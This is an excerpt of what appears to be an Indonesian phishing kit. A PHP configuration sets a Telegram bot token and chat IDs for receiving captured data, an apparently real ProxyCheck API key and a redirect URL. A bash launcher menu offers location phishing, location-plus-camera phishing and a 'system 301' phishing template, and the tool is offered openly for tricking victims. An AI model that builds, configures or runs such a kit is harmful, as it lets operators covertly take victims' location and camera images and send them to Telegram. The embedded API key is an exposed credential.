...
// warning code 33
$botToken = "GANTI_TOKEN_BOT_TELEGRAM";
$chatIds = ["GANTI_CHAT_ID", "GANTI_CHAT_ID"];
// warning code 33
// btw itu untuk chat id nya boleh kembar = keduanya boleh di isi dengan chat id yabg sama.
$proxyCheckApiKey = "52f8eeca0bbe4536ab89b23d2d4def9dcf298f41725fd33db3a4c3b94735e024";
$redirectTo = "https://ngoprek.xyz/index.html"; // ganti dengan url lain.
// systen redirect: google.com/ini-redirect = google.com/index.html
...
run_localhost() {
  ...
  echo -e "${C_YELLOW}   3)${C_RESET} Phising lokasi system 301 (1623)"
...
copy_template() {
  while true; do
    ...
    echo -e "${C_YELLOW}   1)${C_RESET} Phising lokasi"
    echo -e "${C_YELLOW}   2)${C_RESET} Phising lokasi + kamera"
    echo -e "${C_YELLOW}   3)${C_RESET} Phising system 301 (1623)"
    echo -e "${C_YELLOW}   4)${C_RESET} Kembali ke Menu"
